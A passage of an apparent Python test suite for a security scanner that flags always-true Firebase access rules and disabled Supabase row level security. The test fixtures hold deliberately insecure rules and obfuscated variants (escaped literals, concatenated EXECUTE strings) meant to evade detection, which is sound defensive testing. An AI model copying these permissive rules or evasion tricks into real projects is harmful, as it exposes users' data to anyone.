        self.assertEqual(
            {
                "database-tautology.rules",
                "database.rules.json",
                "double-negation.rules",
                "firestore.rules",
                "storage.rules",
                "tautology.rules",
            },
            {finding["path"] for finding in rule_findings},
        )

    def test_req_008_literal_integer_tautologies_block_firestore_and_rtdb(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("firestore.rules", "allow read: if 0 == 0;\nallow write: if 0 == 1;\n")
        fixture.write(
            "database.rules.json",
            '{"rules": {".read": "-7 == -7", ".write": "7 == 8"}}\n',
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(
            {"database.rules.json", "firestore.rules"},
            {finding["path"] for finding in findings},
        )
        self.assertEqual(2, len(findings))

    def test_req_008_literal_string_decimal_and_null_tautologies_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            'allow read: if "x" == "x";\n'
            "allow write: if 0.0 == 0.00;\n"
            "allow create: if null == null;\n"
            'allow update: if "x" == "y";\n'
            "allow delete: if 1.0 == 2.0;\n",
        )
        fixture.write(
            "database.rules.json",
            '{"rules":{".read":"\'x\' == \'x\'",".write":"null == 1"}}\n',
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([1, 2, 3], [item["line"] for item in findings if item["path"] == "firestore.rules"])
        self.assertEqual(1, len([item for item in findings if item["path"] == "database.rules.json"]))

    def test_req_008_parenthesized_and_escaped_literal_tautologies_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read: if (true) == (true);\n"
            "allow write: if (1) == (1);\n"
            'allow create: if ("open") == ("open");\n'
            'allow update: if "open" == "\\u006fpen";\n'
            'allow get: if ("a==b") == ("a==b");\n'
            'allow delete: if "open" == "\\u0063losed";\n',
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([1, 2, 3, 4, 5], [finding["line"] for finding in findings])

    def test_req_008_parenthesized_tautologies_adjacent_to_or_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read: if request.auth != null || (1) == (1);\n"
            'allow write: if request.auth != null || (("x")) == (("x"));\n'
            "allow delete: if request.auth != null || (1) == (2);\n",
        )
        fixture.write(
            "database.rules.json",
            '{"rules":{"items":{".read":"auth != null || (1) == (1)"}}}\n',
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(
            {("database.rules.json", 1), ("firestore.rules", 1), ("firestore.rules", 2)},
            {(finding["path"], finding["line"]) for finding in findings},
        )

    def test_req_008_redacted_rule_filename_retains_internal_classification(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = synthetic_firebase_key()
        assignment_name = "firebase" + "ApiKey"
        fixture.write(
            "config.js",
            f'const {assignment_name} = "{synthetic_value}";\n',
        )
        fixture.write(
            f"{synthetic_value}.rules",
            "allow read: if true;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertEqual(1, completed.returncode)
        self.assertIn("VW-FIREBASE-PERMISSIVE-RULE", rule_ids)
        self.assertNotIn(synthetic_value, completed.stdout)

    def test_req_008_literal_tautologies_inside_or_conditions_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read: if request.auth != null || 1 == 1;\n"
            "allow write: if request.auth != null || \"x\" == 'x';\n"
            "allow create: if request.auth != null || false == false;\n"
            "allow update: if request.auth != null || !false;\n"
            "allow delete: if request.auth != null || true == false;\n",
        )
        fixture.write(
            "database.rules.json",
            json.dumps({"rules": {".read": "auth != null || null == null"}}),
        )
        fixture.write(
            "database.note.rules.json",
            json.dumps({"rules": {"note": ".read: data || 1 == 1"}}),
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(
            [1, 2, 3, 4],
            [item["line"] for item in findings if item["path"] == "firestore.rules"],
        )
        self.assertEqual(
            1,
            len([item for item in findings if item["path"] == "database.rules.json"]),
        )
        self.assertNotIn("database.note.rules.json", {item["path"] for item in findings})

    def test_req_008_dense_or_true_scan_is_linear_in_practice(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(Path("firestore.rules"), "firestore.rules", None)
        text = "allow read: if " + " || ".join(["true"] * 20_000) + ";\n"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 3.0, f"dense Firebase OR scan took {elapsed:.3f}s")
        self.assertEqual(1, len(findings))

    def test_req_008_firebase_tautology_scan_is_bounded_on_long_failure(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(
            Path("firestore.rules"),
            "firestore.rules",
            None,
            b"firestore.rules",
        )
        text = "allow read: if true" + (" " * 65_536) + "X"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.0, f"Firebase rule scan took {elapsed:.3f}s")
        self.assertEqual([], findings)

    def test_req_008_firebase_whitespace_cannot_bypass_permissive_rule_scan(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow" + (" " * 65) + "read: if true;\n"
            "allow read: if true" + (" " * 513) + ";\n",
        )
        fixture.write(
            "database.rules.json",
            '{"rules": {".read"' + (" " * 65) + ": true}}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(3, len(findings))

    def test_req_008_firebase_comments_parentheses_and_string_spacing_are_normalized(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "// allow read: if true;\n"
            "/* allow write: if true; */\n"
            "allow /* operation */ read, write: if (((true))) // explanation\n"
            ";\n",
        )
        fixture.write(
            "database.rules.json",
            '{"url": "https://invalid.example/a/*literal*/", '
            '".read" /* explanation */ : "(( true   == true ))"}\n',
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(
            {"database.rules.json", "firestore.rules"},
            {finding["path"] for finding in findings},
        )

    def test_req_008_firestore_rule_text_inside_string_is_not_executable(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read: if resource.data.note == \"allow read: if true;\";\n"
            "allow update: if request.auth.token.note == \".read: true\";\n"
            "allow delete: if request.auth.token.note == \"allow write: if true;\";\n"
            "allow create: if true;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([4], [finding["line"] for finding in findings])

    def test_req_008_firebase_parenthesis_scan_is_unbounded_and_linear(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(
            Path("firestore.rules"),
            "firestore.rules",
            None,
            b"firestore.rules",
        )
        parentheses = 65_536
        text = "allow read: if " + ("(" * parentheses) + "true" + (")" * parentheses) + ";"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.0, f"Firebase parenthesis scan took {elapsed:.3f}s")
        self.assertEqual(
            ["VW-FIREBASE-PERMISSIVE-RULE"],
            [finding.rule_id for finding in findings],
        )

        failed_findings: list[object] = []
        started = time.perf_counter()
        scanner._scan_text(candidate, text[:-1] + "X", failed_findings)
        failed_elapsed = time.perf_counter() - started
        self.assertLess(
            failed_elapsed,
            1.0,
            f"failing Firebase parenthesis scan took {failed_elapsed:.3f}s",
        )
        self.assertEqual([], failed_findings)

    def test_req_008_firebase_constant_evaluator_covers_bounded_literal_forms(self) -> None:
        fixture = RepositoryFixture(self)
        long_literal = "x" * 257
        fixture.write(
            "firestore.rules",
            "allow read: if 1 != 2;\n"
            "allow write: if 1 < 2;\n"
            "allow create: if !(!true);\n"
            f"allow update: if {'!' * 34}true;\n"
            f'allow get: if "{long_literal}" == "{long_literal}";\n'
            "allow delete: if 1 != 1;\n"
            "allow list: if 2 < 1;\n"
            "allow read: if !true;\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([1, 2, 3, 4, 5], [item["line"] for item in findings])

    def test_req_008_firebase_constant_list_membership_is_exact_and_opaque(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read: if 1 in [1];\n"
            "allow write: if 'a' in ['a'];\n"
            "allow create: if null in [false, null, true];\n"
            "allow update: if 1 in [2];\n"
            "allow get: if 1 in [];\n"
            "allow list: if request.auth.uid in ['a'];\n"
            "allow delete: if 1 in [request.auth.uid];\n"
            "allow read: if 1 in [1, request.auth.uid];\n"
            "allow write: if 1 in dynamicList;\n"
            "allow create: if [1] in [[1]];\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([1, 2, 3], [item["line"] for item in findings])

        scanner = load_scanner_module()
        cases = {
            "1 in [1]": True,
            "'a' /* item */ in /* list */ ['a']": True,
            "1 in [2]": False,
            "1 in []": False,
            "request.auth.uid in ['a']": None,
            "1 in [request.auth.uid]": None,
            "1 in [1, request.auth.uid]": None,
            "1 in dynamicList": None,
            "[1] in [[1]]": None,
            "1 inside [1]": None,
        }
        for expression, expected in cases.items():
            with self.subTest(expression=expression):
                self.assertIs(expected, scanner._firebase_condition_value(expression))

    def test_req_008_firebase_constant_list_membership_is_linear_and_bounded(self) -> None:
        scanner = load_scanner_module()
        literal_list = ",".join(str(value) for value in range(20_000))
        expressions = (
            (f"19999 in [{literal_list}]", None),
            (f"-1 in [{literal_list}]", None),
            (f"1 in [{literal_list}, request.auth.uid]", None),
        )

        started = time.perf_counter()
        for expression, expected in expressions:
            self.assertIs(expected, scanner._firebase_condition_value(expression))
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 2.0, f"Firebase membership scan took {elapsed:.3f}s")

    def test_req_008_firebase_boolean_precedence_and_tristate_are_exact(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read: if true && true;\n"
            "allow write: if !(true && false);\n"
            "allow create: if false || true && true;\n"
            "allow update: if request.auth != null || true;\n"
            "allow get: if true || false && false;\n"
            "allow list: if false && (true || false);\n"
            "allow delete: if (true || false) && false;\n"
            "allow read: if !(true || false);\n"
            "allow write: if request.auth != null && true;\n"
            "allow create: if false || request.auth != null;\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([1, 2, 3, 4, 5], [item["line"] for item in findings])

    def test_req_008_unconditional_arithmetic_and_ternary_rules_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read;\n"
            "allow read, write;\n"
            "allow create: if 1 + 1 == 2;\n"
            "allow update: if 2 * 3 == 6 && 7 % 4 == 3;\n"
            "allow delete: if true == 1 < 2;\n"
            "allow get: if false ? false : true;\n"
            "allow list: if true ? false : true;\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([1, 2, 3, 4, 5, 6], [item["line"] for item in findings])

        scanner = load_scanner_module()
        cases = {
            "8 / 4 == 2": True,
            "-(1 + 1) == -2": True,
            "+2 * 3 == 6": True,
            "-7 % 4 == -3": True,
            "-7 % 4 == 1": False,
            "false ? false : true ? true : false": True,
            "true ? false : true": False,
            "1 / 0 == 1": None,
            "request.auth != null ? true : true": True,
        }
        for expression, expected in cases.items():
            with self.subTest(expression=expression):
                self.assertIs(expected, scanner._firebase_condition_value(expression))

    def test_req_008_rtdb_strict_operators_and_inner_strings_are_exact(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "database.strict.rules.json",
            "{\n"
            '  "rules": {\n'
            '    ".read": "1 === 1",\n'
            '    ".write": "1 !== 2"\n'
            "  }\n"
            "}\n",
        )
        fixture.write(
            "database.safe.rules.json",
            json.dumps(
                {
                    "rules": {
                        ".read": "data.val() == 'x || true'",
                        ".write": "data.val() == 'true || x'",
                        "safe-comment": {
                            ".read": "auth != null /* || true */",
                        },
                    }
                },
                indent=2,
            ),
        )
        fixture.write(
            "database.comment.rules.json",
            '{"rules":{".read":"auth != null /* explanation */ || true"}}\n',
        )
        fixture.write(
            "database.strict-escaped.rules.json",
            '{"rules":{"\\u002eread":"\\u0031 \\u003d\\u003d\\u003d 1"}}\n',
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(
            [
                ("database.comment.rules.json", 1),
                ("database.strict-escaped.rules.json", 1),
                ("database.strict.rules.json", 3),
                ("database.strict.rules.json", 4),
            ],
            [(item["path"], item["line"]) for item in findings],
        )

    def test_req_008_firebase_boolean_evaluator_matches_deterministic_fuzz(self) -> None:
        scanner = load_scanner_module()
        generator = random.Random(0x51A7E)
        leaves: tuple[tuple[str, bool | None], ...] = (
            ("true", True),
            ("false", False),
            ("1 == 1", True),
            ("1 === 2", False),
            ("1 !== 2", True),
            ('"x" == "x"', True),
            ("request.auth != null", None),
            ("data.val() == 'x || true'", None),
        )

        def negate(value: bool | None) -> bool | None:
            return None if value is None else not value

        def conjunction(left: bool | None, right: bool | None) -> bool | None:
            if left is False or right is False:
                return False
            if left is True and right is True:
                return True
            return None

        def disjunction(left: bool | None, right: bool | None) -> bool | None:
            if left is True or right is True:
                return True
            if left is False and right is False:
                return False
            return None

        def atom(depth: int) -> tuple[str, bool | None]:
            if depth <= 0 or generator.randrange(4) == 0:
                return leaves[generator.randrange(len(leaves))]
            if generator.randrange(2) == 0:
                expression, value = atom(depth - 1)
                return f"!({expression})", negate(value)
            expression, value = boolean_expression(depth - 1)
            return f"({expression})", value

        def and_expression(depth: int) -> tuple[str, bool | None]:
            expression, value = atom(depth)
            for _ in range(generator.randrange(3)):
                right_expression, right_value = atom(depth)
                expression += f" && {right_expression}"
                value = conjunction(value, right_value)
            return expression, value

        def boolean_expression(depth: int) -> tuple[str, bool | None]:
            expression, value = and_expression(depth)
            for _ in range(generator.randrange(3)):
                right_expression, right_value = and_expression(depth)
                expression += f" || {right_expression}"
                value = disjunction(value, right_value)
            return expression, value

        for case_index in range(512):
            expression, expected = boolean_expression(4)
            with self.subTest(case=case_index, expression=expression):
                self.assertIs(expected, scanner._firebase_condition_value(expression))

    def test_req_008_firebase_boolean_evaluator_is_iterative_and_bounded(self) -> None:
        scanner = load_scanner_module()
        cases = (
            (("!" * 200_000) + "true", True),
            (" || ".join(["true"] * 20_000), True),
            (" && ".join(["request.auth != null"] * 20_000), None),
        )

        started = time.perf_counter()
        for expression, expected in cases:
            self.assertIs(expected, scanner._firebase_condition_value(expression))
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 2.0, f"bounded Firebase evaluation took {elapsed:.3f}s")

    def test_req_008_firebase_preserves_whitespace_inside_string_literals(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            'allow read: if "a  b" == "a b";\n'
            'allow write: if "a  b" == "a  b";\n'
            'allow create: if "a\tb" == "a b";\n',
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([2], [item["line"] for item in findings])

    def test_req_008_rtdb_json_escapes_cannot_hide_permissive_rules(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "database.rules.json",
            '{"rules":{"\\u002eread":true}}\n',
        )
        fixture.write(
            "database.value.rules.json",
            '{"rules":{".read":"\\u0074rue"}}\n',
        )
        fixture.write(
            "database.condition.rules.json",
            '{"rules":{".\\u0072ead":"auth != null || \\u0074rue"}}\n',
        )
        fixture.write(
            "database.quoted.rules.json",
            '{"rules":{".read":"\\\"x\\\" == \\\"x\\\""}}\n',
        )
        fixture.write(
            "database.safe.rules.json",
            '{"rules":{"\\u002eread":"\\u0066alse"}}\n',
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(
            {
                "database.condition.rules.json",
                "database.quoted.rules.json",
                "database.rules.json",
                "database.value.rules.json",
            },
            {item["path"] for item in findings},
        )

    def test_req_008_explicitly_disabled_supabase_rls_blocks(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "supabase/migrations/001_access.sql",
            "ALTER TABLE public.accounts\n  DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.profiles FORCE ROW LEVEL SECURITY;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rls_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-SUPABASE-RLS-DISABLED"]
        self.assertEqual(1, len(rls_findings))
        self.assertEqual("supabase/migrations/001_access.sql", rls_findings[0]["path"])
        self.assertEqual(1, rls_findings[0]["line"])

    def test_req_008_supabase_rls_supports_unicode_and_quoted_identifiers(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "schema.sql",
            "ALTER TABLE público.contas_ação DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE 数据.客户 * DISABLE ROW LEVEL SECURITY;\n"
            'ALTER TABLE "linha\nquebrada"."tabela" DISABLE ROW LEVEL SECURITY;\n'
            "ALTER TABLE 1inválida DISABLE ROW LEVEL SECURITY;\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual([1, 2, 3], [item["line"] for item in findings])

    def test_req_008_supabase_rls_line_mapping_is_linear(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(
            Path("schema.sql"),
            "schema.sql",
            None,
            b"schema.sql",
        )
        statement_count = 20_000
        text = "ALTER TABLE t DISABLE ROW LEVEL SECURITY;\n" * statement_count
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.5, f"SQL rule scan took {elapsed:.3f}s")
        rls_findings = [
            finding
            for finding in findings
            if finding.rule_id == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual(statement_count, len(rls_findings))
        self.assertEqual(1, rls_findings[0].line)
        self.assertEqual(statement_count, rls_findings[-1].line)

    def test_req_008_sql_literals_comments_and_invalid_syntax_do_not_spoof_rls(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "schema.sql",
            "-- ALTER TABLE ignored DISABLE ROW LEVEL SECURITY;\n"
            "SELECT 'ALTER TABLE ignored DISABLE ROW LEVEL SECURITY';\n"
            "DO $body$ ALTER TABLE ignored DISABLE ROW LEVEL SECURITY; $body$;\n"
            'SELECT "ALTER TABLE ignored DISABLE ROW LEVEL SECURITY";\n'
            "ALTER /* reviewed */ TABLE public.accounts /* boundary */ DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.accounts * DISABLE ROW LEVEL SECURITY;\n"
            "CREATE TABLE no_implicit_claim(id bigint);\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [item for item in report["findings"] if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"]
        self.assertEqual([3, 5, 6], [item["line"] for item in findings])

    def test_req_008_postgres_executable_and_escaped_forms_are_classified(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "blocked.sql",
            "SELECT E'escaped \\\' quote'; ALTER TABLE accounts DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE accounts ADD COLUMN note text, DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE accounts ENABLE TRIGGER ALL, DISABLE ROW LEVEL SECURITY;\n"
            'ALTER TABLE U&"d\\0061ta" DISABLE ROW LEVEL SECURITY;\n'
            "ALTER TABLE 😀 DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE a\u0338 DISABLE ROW LEVEL SECURITY;\n"
            'ALTER TABLE U&"d!0061ta" UESCAPE \'!\' DISABLE ROW LEVEL SECURITY;\n'
            "DO $body$\nBEGIN\n"
            "  ALTER TABLE nested_accounts DISABLE ROW LEVEL SECURITY;\n"
            "END\n$body$;\n",
        )
        fixture.write(
            "safe.sql",
            "SELECT E'escaped \\\' ALTER TABLE fake DISABLE ROW LEVEL SECURITY';\n"
            "SELECT $$ ALTER TABLE fake DISABLE ROW LEVEL SECURITY; $$;\n"
            "COPY audit_log FROM stdin;\n"
            "ALTER TABLE copied_text DISABLE ROW LEVEL SECURITY;\n"
            "\\.\n"
            "SELECT copy FROM stdin;\n"
            'ALTER TABLE U&"data" UESCAPE !! DISABLE ROW LEVEL SECURITY;\n',
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual({"blocked.sql"}, {item["path"] for item in findings})
        self.assertEqual([1, 2, 3, 4, 5, 6, 7, 10], [item["line"] for item in findings])

    def test_req_008_postgres_dynamic_and_routine_bodies_are_executable(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "executable.sql",
            "DO $$ BEGIN EXECUTE 'ALTER TABLE dynamic_text DISABLE ROW LEVEL SECURITY'; END $$;\n"
            "DO $outer$ BEGIN EXECUTE $ddl$ALTER TABLE dynamic_dollar DISABLE ROW LEVEL SECURITY;$ddl$; END $outer$;\n"
            'DO LANGUAGE "plpgsql" $body$ BEGIN ALTER TABLE quoted_language DISABLE ROW LEVEL SECURITY; END $body$;\n'
            'DO LANGUAGE U&"plpgsql" $body$ BEGIN ALTER TABLE unicode_language DISABLE ROW LEVEL SECURITY; END $body$;\n'
            "CREATE FUNCTION change_access() RETURNS void LANGUAGE plpgsql AS $fn$ BEGIN EXECUTE 'ALTER TABLE function_table DISABLE ROW LEVEL SECURITY'; END $fn$;\n"
            "CREATE PROCEDURE change_more_access() LANGUAGE plpgsql AS $proc$ BEGIN ALTER TABLE procedure_table DISABLE ROW LEVEL SECURITY; END $proc$;\n"
            "DO $😀$ BEGIN ALTER TABLE highbit_tag DISABLE ROW LEVEL SECURITY; END $😀$;\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual([1, 2, 3, 4, 5, 6, 7], [item["line"] for item in findings])

    def test_req_008_postgres_constant_execute_literals_are_decoded(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "constant-execute.sql",
            r"DO $$ BEGIN EXECUTE E'ALTER\x20TABLE hex_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
            r"DO $$ BEGIN EXECUTE E'ALTER\040TABLE octal_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
            r"DO $$ BEGIN EXECUTE E'ALTER\u0020TABLE unicode_e_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
            r"DO $$ BEGIN EXECUTE U&'ALTER\0020TABLE unicode_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
            r"DO $$ BEGIN EXECUTE U&'ALTER!0020TABLE custom_escape DISABLE ROW LEVEL SECURITY' UESCAPE '!'; END $$;" "\n"
            "DO $$ BEGIN EXECUTE 'ALTER ' || 'TABLE concatenated DISABLE ROW LEVEL SECURITY'; END $$;\n"
            r"DO $$ BEGIN EXECUTE E'AL\x54ER' /* join */ || U&'\0020TABLE ' || $ddl$mixed DISABLE ROW LEVEL SECURITY$ddl$; END $$;" "\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual([1, 2, 3, 4, 5, 6, 7], [item["line"] for item in findings])

    def test_req_008_postgres_constant_execute_compositions_are_decoded(self) -> None:
        fixture = RepositoryFixture(self)
        maximum_grouping = 64
        constant_sql = "'ALTER TABLE bounded DISABLE ROW LEVEL SECURITY'"
        positive_sources = {
            "grouped.sql": (
                "DO $$ BEGIN EXECUTE "
                "('ALTER TABLE grouped DISABLE ROW LEVEL SECURITY'); END $$;\n"
            ),
            "grouped-concat.sql": (
                "DO $$ BEGIN EXECUTE "
                "(('ALTER '::text) || "
                "('TABLE grouped_concat DISABLE ROW LEVEL SECURITY'::text)); "
                "END $$;\n"
            ),
            "mixed-literals.sql": (
                r"DO $$ BEGIN EXECUTE ((E'AL\x54ER '::text) || "
                r"(U&'\0020TABLE mixed DISABLE ROW LEVEL SECURITY')::text) "
                "USING 1; END $$;\n"
            ),
            "cast-trivia.sql": (
                "DO $$ BEGIN EXECUTE "
                "('ALTER TABLE cast_trivia DISABLE ROW LEVEL SECURITY') "
                ":: /* identity */ TEXT; END $$;\n"
            ),
            "dollar-group.sql": (
                "DO $$ BEGIN EXECUTE "
                "(($ddl$ALTER $ddl$) || "
                "($ddl$TABLE dollar_group DISABLE ROW LEVEL SECURITY$ddl$::text)); "
                "END $$;\n"
            ),
            "standard-cast.sql": (
                "DO $$ BEGIN EXECUTE "
                "CAST('ALTER TABLE standard_cast DISABLE ROW LEVEL SECURITY' AS text); "
                "END $$;\n"
            ),
            "qualified-text-cast.sql": (
                "DO $$ BEGIN EXECUTE "
                "'ALTER TABLE qualified_cast DISABLE ROW LEVEL SECURITY'"
                "::pg_catalog.text; END $$;\n"
            ),
            "nested-standard-cast.sql": (
                "DO $$ BEGIN EXECUTE CAST("
                "('ALTER ' || 'TABLE nested_cast DISABLE ROW LEVEL SECURITY') "
                "AS pg_catalog.text)::text; END $$;\n"
            ),
            "adjacent-newline.sql": (
                "DO $$ BEGIN EXECUTE 'ALTER '\n"
                " 'TABLE adjacent DISABLE ROW LEVEL SECURITY'; END $$;\n"
            ),
            "adjacent-comment-newline.sql": (
                "DO $$ BEGIN EXECUTE 'ALTER ' /* literal join\n"
                " */ 'TABLE adjacent_comment DISABLE ROW LEVEL SECURITY'; END $$;\n"
            ),
            "maximum-grouping.sql": (
                "DO $$ BEGIN EXECUTE "
                + "(" * maximum_grouping
                + constant_sql
                + ")" * maximum_grouping
                + "; END $$;\n"
            ),
            "deep-grouping.sql": (
                "DO $$ BEGIN EXECUTE "
                + "(" * 512
                + constant_sql
                + ")" * 512
                + "; END $$;\n"
            ),
        }
        for path, source in positive_sources.items():
            fixture.write(path, source)

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual(set(positive_sources), {item["path"] for item in findings})
        self.assertEqual(len(positive_sources), len(findings))
        self.assertTrue(all(item["line"] == 1 for item in findings))

    def test_req_008_postgres_narrow_literals_and_adjacent_bodies_block(self) -> None:
        fixture = RepositoryFixture(self)
        payload = "ALTER TABLE narrow DISABLE ROW LEVEL SECURITY"
        character_literals = "\n".join(repr(character) for character in payload)
        deep_grouping = 512
        fixture.write(
            "narrow-execute.sql",
            "DO $$ BEGIN EXECUTE " + character_literals + "; END $$;\n",
        )
        fixture.write(
            "deep-after-literal.sql",
            "DO $$ BEGIN EXECUTE 'SELECT ' || "
            + "(" * deep_grouping
            + "'ALTER TABLE bounded_tail DISABLE ROW LEVEL SECURITY'"
            + ")" * deep_grouping
            + "; END $$;\n",
        )
        fixture.write(
            "adjacent-do.sql",
            "DO 'BEGIN AL'\n"
            "'TER TABLE adjacent_do DISABLE ROW LEVEL SECURITY; END';\n",
        )
        fixture.write(
            "adjacent-function.sql",
            "CREATE FUNCTION change_access() RETURNS void AS 'BEGIN AL'\n"
            "'TER TABLE adjacent_function DISABLE ROW LEVEL SECURITY; END' "
            "LANGUAGE plpgsql;\n",
        )
        fixture.write(
            "harmless-narrow.sql",
            "DO $$ BEGIN EXECUTE "
            + "\n".join(repr(character) for character in "SELECT 1")
            + "; END $$;\n",
        )
        fixture.write(
            "harmless-deep.sql",
            "DO $$ BEGIN EXECUTE "
            + "(" * deep_grouping
            + "'SELECT 1'"
            + ")" * deep_grouping
            + "; END $$;\n",
        )

